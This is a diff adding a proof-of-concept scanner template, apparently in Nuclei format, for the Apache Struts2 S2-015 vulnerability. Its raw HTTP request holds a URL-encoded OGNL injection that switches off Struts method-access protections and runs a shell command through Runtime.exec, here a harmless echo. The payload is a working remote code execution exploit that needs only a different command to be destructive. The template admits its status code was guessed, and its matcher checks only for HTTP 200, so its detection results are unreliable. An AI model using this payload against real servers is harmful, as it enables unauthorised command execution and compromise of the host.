@@ -1,0 +1,36 @@
+id: poc-llememx9uib33mlg
+info:
+  name: S2_015
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/llememx9uib33mlg
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: llememx9uib33mlg
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%2078468794903108696%27%29.getInputStream%28%29%29%2C%23q%7D.action HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    78468794903108696
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
